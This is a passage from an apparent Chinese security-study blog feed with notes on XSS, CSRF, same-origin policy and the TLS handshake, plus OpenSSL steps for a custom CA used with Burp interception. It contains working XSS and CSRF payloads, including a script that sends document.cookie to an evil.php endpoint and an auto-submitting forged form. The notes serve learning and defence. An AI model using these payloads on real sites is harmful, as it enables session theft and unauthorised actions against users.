line</td><br><td>Carriage&nbsp;Return</td><br></tr><br><tr><br><td>URL</td><br><td>%09</td><br><td>%10</td><br><td>%13</td><br></tr><br><tr><br><td>Minimal&nbsp;Sized&nbsp;Hex</td><br><td>&amp;#x9</td><br><td>&amp;#xA</td><br><td>&amp;#xD</td><br></tr><br><tr><br><td>Maximum&nbsp;Sized&nbsp;Hex</td><br><td>&amp;#x0000009;</td><br><td>&amp;#x000000A;</td><br><td>&amp;#x000000D;</td><br></tr><br><tr><br><td>Minimum&nbsp;Sized&nbsp;Decimal</td><br><td>&amp;#9</td><br><td>&amp;#10</td><br><td>&amp;#13</td><br></tr><br><tr><br><td>Maximum&nbsp;Sized&nbsp;Decimal</td><br><td>&amp;#x0000009;</td><br><td>&amp;#x0000009;</td><br><td>&amp;#0000009;</td><br></tr><br></tbody><br></table><h1 id="Cross-Site-Request-Forgery-CSRF-跨站脚本请求伪造"><a href="#Cross-Site-Request-Forgery-CSRF-跨站脚本请求伪造" class="headerlink" title="Cross-Site Request Forgery (CSRF) 跨站脚本请求伪造"></a>Cross-Site Request Forgery (CSRF) 跨站脚本请求伪造</h1><p>向服务器提交数据</p><p><img src="https://www.owasp.org//images/f/f3/Session_riding.GIF" alt=""></p><p>在a.com中访问b.com(或者受害者通过邮件点击访问example.com/delete?rule=*)，<strong>某些浏览器将自动发送其cookie</strong>。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://b.com/test.php"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure></p><ul><li>自动删除文章</li><li>自动添加管理员账号</li></ul><p>GET scenario<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://bank.com/transfer.do?acct=MARIA&amp;amount=100000"</span> <span class="attr">width</span>=<span class="string">"0"</span> <span class="attr">height</span>=<span class="string">"0"</span> <span class="attr">border</span>=<span class="string">"0"</span>&gt;</span></div></pre></td></tr></table></figure></p><p>POST scenario<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- csrftest.html --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">'document.CSRF.submit()'</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 如果表单中存在name='submit'会冲突 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">'http://tagetWebsite/Authenticate.jsp'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">name</span>=<span class="string">'CSRF'</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'name'</span> <span class="attr">value</span>=<span class="string">'Hacked'</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'password'</span> <span class="attr">value</span>=<span class="string">'Hacked'</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p><p>结合XSS漏洞攻击将悄无声息。</p><h4 id="Prevent-CSRF-Vulnerabilities"><a href="#Prevent-CSRF-Vulnerabilities" class="headerlink" title="Prevent CSRF Vulnerabilities"></a>Prevent CSRF Vulnerabilities</h4><ol><li><p>Check standard headers to verify the request is same origin </p><ul><li>Origin Header </li><li>Referer Header (绕过referer)</li></ul></li><li><p>AND Check CSRF token </p></li></ol><h4 id="same-origin-policy"><a href="#same-origin-policy" class="headerlink" title="same-origin policy"></a>same-origin policy</h4><blockquote><p>同源策略:同协议、域名、端口,不能跨域访问。</p></blockquote><p><img src="http://i.imgur.com/dswMO29.png" alt=""></p><p>如何实现跨域访问？</p><ol><li>Access-Control-Allow-Origin 头</li></ol><p>a.com 允许其他域访问本域资源<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> header(<span class="string">"Access-Control-Allow-Origin: *"</span>); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>b.com<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$.get(<span class="string">"http://a.com/test.php"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">alert(data);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><ol><li><p>getJSON</p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$.getJSON(<span class="string">"http://www.runoob.com/try/ajax/jsonp.php?jsoncallback=?"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123; <span class="comment">// 对返回的json的处理代码 &#125;);</span></div></pre></td></tr></table></figure></li><li><p>iframe</p></li></ol><h4 id="跨域策略文件"><a href="#跨域策略文件" class="headerlink" title="跨域策略文件"></a>跨域策略文件</h4><p>crossdomain.xml</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Cross-site-Scripting-XSS-跨站脚本&quot;&gt;&lt;a href=&quot;#Cross-site-Scripting-XSS-跨站脚本&quot; class=&quot;headerlink&quot; title=&quot;Cross-site Scripting (XSS) 跨站脚本&quot;&gt;&lt;/a&gt;Cross-site Scripting (XSS) 跨站脚本&lt;/h1&gt;&lt;p&gt;恶意代码注入&lt;/p&gt;
&lt;h4 id=&quot;XSS-using-Script-in-Attributes&quot;&gt;&lt;a href=&quot;#XSS-using-Script-in-Attributes&quot; class=&quot;headerlink&quot; title=&quot;XSS using Script in Attributes&quot;&gt;&lt;/a&gt;XSS using Script in Attributes&lt;/h4&gt;&lt;p&gt;XSS attacks may be conducted without using &lt;script&gt;&lt;/script&gt; tags. Other tags will do exactly the same thing, for example:&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onload&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;alert(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;test1&lt;/span&gt;&#39;)&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;or other attributes like: onmouseover, onerror.&lt;br&gt;onmouseover&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onmouseover&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;alert(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;Wufff&lt;/span&gt;!&#39;)&amp;gt;&lt;/span&gt;click me!&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;b&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;onerror&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;http://url.to.file.which/not.exist&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onerror&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;alert(document.cookie);&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;XSS-using-Script-Via-Encoded-URI-Schemes&quot;&gt;&lt;a href=&quot;#XSS-using-Script-Via-Encoded-URI-Schemes&quot; class=&quot;headerlink&quot; title=&quot;XSS using Script Via Encoded URI Schemes&quot;&gt;&lt;/a&gt;XSS using Script Via Encoded URI Schemes&lt;/h4&gt;&lt;p&gt;使用编码绕过过滤 如:a=&amp;amp;#X41 (UTF-8)&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;IMG&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;SRC&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;j&amp;amp;#X41vascript:alert(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;test2&lt;/span&gt;&#39;)&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;XSS-using-code-encoding&quot;&gt;&lt;a href=&quot;#XSS-using-code-encoding&quot; class=&quot;headerlink&quot; title=&quot;XSS using code encoding&quot;&gt;&lt;/a&gt;XSS using code encoding&lt;/h4&gt;&lt;p&gt;We may encode our script in base64 and place it in META tag.&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;META&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;HTTP-EQUIV&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;CONTENT&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;伪协议&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;click&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;反射型XSS&quot;&gt;&lt;a href=&quot;#反射型XSS&quot; class=&quot;headerlink&quot; title=&quot;反射型XSS&quot;&gt;&lt;/a&gt;反射型XSS&lt;/h2&gt;&lt;p&gt;获取用户cookies&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;SCRIPT&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;var adr = &#39;../evil.php?cakemonster=&#39; + escape(document.cookie);&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;SCRIPT&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SSL协议</title>
    <link href="http://ruos.org/2015/04/08/SSL/"/>
    <id>http://ruos.org/2015/04/08/SSL/</id>
    <published>2015-04-08T14:56:29.000Z</published>
    <updated>2017-11-01T02:19:19.137Z</updated>
    
    <content type="html"><![CDATA[<p>SSL (Secure Socket Layer)安全套接字层协议<br>    TLS (Transport Layer Security)传输层安全协议</p><p><img src="https://blog.cloudflare.com/content/images/2014/Sep/keyless-comic-v1.gif" alt=""></p><p>第一步，爱丽丝给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。<br>第二步，鲍勃确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。<br>第三步，爱丽丝确认数字证书有效，然后生成一个新的随机数（Premaster secret），并使用数字证书中的公钥，加密这个随机数，发给鲍勃。<br>第四步，鲍勃使用自己的私钥，获取爱丽丝发来的随机数（即Premaster secret）。<br>第五步，爱丽丝和鲍勃根据约定的加密方法，使用前面的三个随机数，生成”对话密钥”（session key），用来加密接下来的整个对话过程。</p><p><img src="https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_rsa.jpg" alt=""></p><p>Tip:<br>1，生成对话密钥一共需要三个随机数，第三个发出的随机数是用服务端公钥加密的，除了客户端知道和服务端能解密出来外其他人不知道。<br>2，握手之后的对话使用”对话密钥”加密（对称加密），服务器的公钥和私钥只用于加密和解密”premaster secret”（非对称加密），无其他作用。<br>3，服务器公钥放在服务器的数字证书之中。</p><p>Diffie-Hellman</p><p><img src="https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_diffie_hellman.jpg" alt=""></p><p>curl -k <a href="https://www.baidu.com/img/baidu_jgylogo3.gif" target="_blank" rel="external">https://www.baidu.com/img/baidu_jgylogo3.gif</a></p><p>Wireshark</p><p>192.168.1.5    180.97.33.107 SSL Client Hello<br>180.97.33.107    192.168.1.5    TLSv1.2        Server Hello<br>180.97.33.107    192.168.1.5    TLSv1.2        Certificate, Server Key Exchange（服务端DH参数）, Server Hello Done<br>192.168.1.5    180.97.33.107    TLSv1.2     Client Key Exchange（客户端DH参数）, Change Cipher Spec, Encrypted Handshake Message<br>180.97.33.107    192.168.1.5    TLSv1.2        Change Cipher Spec, Encrypted Handshake Message</p><p>Curl -v 显示交互过程</p><p>* TLSv1.2 (OUT), TLS handshake, Client hello (1):<br>* TLSv1.2 (IN), TLS handshake, Server hello (2):<br>* NPN, negotiated HTTP1.1<br>* TLSv1.2 (IN), TLS handshake, Certificate (11):<br>* TLSv1.2 (IN), TLS handshake, Server key exchange (12):<br>* TLSv1.2 (IN), TLS handshake, Server finished (14):<br>* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):<br>* TLSv1.2 (OUT), TLS change cipher, Client hello (1):<br>* TLSv1.2 (OUT), TLS handshake, Unknown (67):<br>* TLSv1.2 (OUT), TLS handshake, Finished (20):<br>* TLSv1.2 (IN), TLS change cipher, Client hello (1):<br>* TLSv1.2 (IN), TLS handshake, Finished (20):<br>* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256</p><a id="more"></a><h3 id="证书生成"><a href="#证书生成" class="headerlink" title="证书生成"></a>证书生成</h3><p>1，自签名证书</p><p>生成私钥<br><code>openssl genrsa -des3 -out server.key 4096</code></p><p>去除key口令<br><code>openssl rsa -in server.key -out server.key</code></p><p>生成CSR<br><code>openssl req -new -key server.key -out server.csr -config openssl.cfg -subj &quot;/C=CN/ST=SC/L=CD/O=CerTest/OU=CerTest/CN=mm.ru0.pw&quot;</code></p><p>CN = baidu.com 通用名称<br>O = BeiJing Baidu Netcom Science Technology Co., Ltd 组织单位<br>OU = service operation department. 组织<br>L = beijing 城市<br>S = beijing 省/州名<br>C = CN 国家/地区</p><p>生成自签名证书<br><code>openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt</code></p><blockquote><p>openssl 生成私钥，通过私钥生成csr。权威证书机构通过这两个文件给你生成cer证书文件。但自建CA可为自己的请求签发证书，当然这是不可信的。当将CA导入“受信任的根证书颁发机构”后CA便认为该证书是可信的了。burp：8080的证书导入系统后相当于自己信任了自己。</p></blockquote><p>2，自建CA签发证书</p><p>Step1:生成根CA</p><p>生成随机数<br><code>openssl rand -out private/.rand 1000</code></p><p>生成私钥<br><code>openssl genrsa -aes256 -out cakey.pem 4096</code></p><p>生成CSR<br><code>openssl req -new -key cakey.pem -out ca.csr -subj &quot;/C=CN/ST=SC/O=CerTest/OU=Test Certificate Authority/CN=Test Root CA&quot; -config openssl.cfg</code></p><p>自签发根证书v3<br><code>openssl x509 -req -days 365 -sha256 -extfile openssl.cfg -extensions v3_ca -signkey cakey.pem -in ca.csr -out ca.crt</code></p><p>Step2:生成服务端证书<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -aes256 -out server-key.pem 2048</div><div class="line">openssl req -new -key server-key.pem -out server.csr -subj "/O=CerTest/OU=Test Certificate Authority/CN=*.baidu.com" -config openssl.cfg</div></pre></td></tr></table></figure></p><p>Step3:签发证书<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl x509 -req -days 365 -sha256 -extfile openssl.cfg -extensions v3_req -CA ca.crt -CAkey cakey.pem -CAserial ca.srl -CAcreateserial -in server.csr -out server.crt</div></pre></td></tr></table></figure></p><p>？<br>openssl ca -in server.csr -out server.crt -cert ca.crt -keyfile cakey.pem -extfile openssl.cfg -extensions v3_req</p><p>转换成PKCS12格式供Burp使用<br><code>openssl pkcs12 -export -inkey server-key.pem -in server.crt -out server.pfx</code></p><p><img src="http://i.imgur.com/RdLCQVe.png" alt=""></p><p>将CA导入受信任的根证书颁发机构后若火狐仍不信任则在火狐证书管理器中对其编辑信任。</p><p><img src="http://i.imgur.com/A3FSl0q.png" alt=""></p><p>Chrome https代理死活出错解决办法</p><p>Chrome -&gt; Fiddler -&gt; Burp</p><p>配置Fiddler Gateway指向Burp</p><p>Manual Proxy Configuration:<br><a href="http://127.0.01:8080" target="_blank" rel="external">http://127.0.01:8080</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SSL (Secure Socket Layer)安全套接字层协议&lt;br&gt;    TLS (Transport Layer Security)传输层安全协议&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.cloudflare.com/content/images/2014/Sep/keyless-comic-v1.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;第一步，爱丽丝给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。&lt;br&gt;第二步，鲍勃确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。&lt;br&gt;第三步，爱丽丝确认数字证书有效，然后生成一个新的随机数（Premaster secret），并使用数字证书中的公钥，加密这个随机数，发给鲍勃。&lt;br&gt;第四步，鲍勃使用自己的私钥，获取爱丽丝发来的随机数（即Premaster secret）。&lt;br&gt;第五步，爱丽丝和鲍勃根据约定的加密方法，使用前面的三个随机数，生成”对话密钥”（session key），用来加密接下来的整个对话过程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_rsa.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Tip:&lt;br&gt;1，生成对话密钥一共需要三个随机数，第三个发出的随机数是用服务端公钥加密的，除了客户端知道和服务端能解密出来外其他人不知道。&lt;br&gt;2，握手之后的对话使用”对话密钥”加密（对称加密），服务器的公钥和私钥只用于加密和解密”premaster secret”（非对称加密），无其他作用。&lt;br&gt;3，服务器公钥放在服务器的数字证书之中。&lt;/p&gt;
&lt;p&gt;Diffie-Hellman&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_diffie_hellman.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;curl -k &lt;a href=&quot;https://www.baidu.com/img/baidu_jgylogo3.gif&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.baidu.com/img/baidu_jgylogo3.gif&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Wireshark&lt;/p&gt;
&lt;p&gt;192.168.1.5    180.97.33.107 SSL Client Hello&lt;br&gt;180.97.33.107    192.168.1.5    TLSv1.2        Server Hello&lt;br&gt;180.97.33.107    192.168.1.5    TLSv1.2        Certificate, Server Key Exchange（服务端DH参数）, Server Hello Done&lt;br&gt;192.168.1.5    180.97.33.107    TLSv1.2     Client Key Exchange（客户端DH参数）, Change Cipher Spec, Encrypted Handshake Message&lt;br&gt;180.97.33.107    192.168.1.5    TLSv1.2        Change Cipher Spec, Encrypted Handshake Message&lt;/p&gt;
&lt;p&gt;Curl -v 显示交互过程&lt;/p&gt;
&lt;p&gt;* TLSv1.2 (OUT), TLS handshake, Client hello (1):&lt;br&gt;* TLSv1.2 (IN), TLS handshake, Server hello (2):&lt;br&gt;* NPN, negotiated HTTP1.1&lt;br&gt;* TLSv1.2 (IN), TLS handshake, Certificate (11):&lt;br&gt;* TLSv1.2 (IN), TLS handshake, Server key exchange (12):&lt;br&gt;* TLSv1.2 (IN), TLS handshake, Server finished (14):&lt;br&gt;* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):&lt;br&gt;* TLSv1.2 (OUT), TLS change cipher, Client hello (1):&lt;br&gt;* TLSv1.2 (OUT), TLS handshake, Unknown (67):&lt;br&gt;* TLSv1.2 (OUT), TLS handshake, Finished (20):&lt;br&gt;* TLSv1.2 (IN), TLS change cipher, Client hello (1):&lt;br&gt;* TLSv1.2 (IN), TLS handshake, Finished (20):&lt;br&gt;* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
